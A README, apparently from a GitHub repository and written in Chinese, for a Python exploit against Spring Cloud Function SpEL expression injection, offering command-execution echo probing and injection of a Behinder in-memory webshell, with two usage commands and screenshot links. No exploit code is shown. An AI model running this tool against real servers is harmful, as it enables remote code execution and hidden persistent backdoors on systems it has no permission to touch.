# Spring-cloud-function-SpEL-RCE
针对Spring-cloud-function-SpEL表达式注入进行回显和内存马注入的exp

2022.10.17修改 
spring2.6.x后续版本注册方式改变，更新后支持后续spring版本内存马注入。

# 使用
回显探测
<img width="800" alt="image" src="https://user-images.githubusercontent.com/38367493/165876663-0e050317-7852-4f91-a683-1a060b5dfdd6.png">

python3 SpringCloudFunction_rce.py -url http://127.0.0.1:8088/

<img width="565" alt="image" src="https://user-images.githubusercontent.com/38367493/165876405-edbbee29-bb5c-4cc3-a03c-881b8a9d9c4b.png">

注入冰蝎

python3 SpringCloudFunction_rce.py -url http://127.0.0.1:8088/ -inject

<img width="773" alt="image" src="https://user-images.githubusercontent.com/38367493/165486095-87938c34-b3b2-43f3-a341-17ef606bd448.png">

<img width="1000" alt="image" src="https://user-images.githubusercontent.com/38367493/165486771-01e3ea5b-dbd6-4e14-9559-fa24483faa59.png">

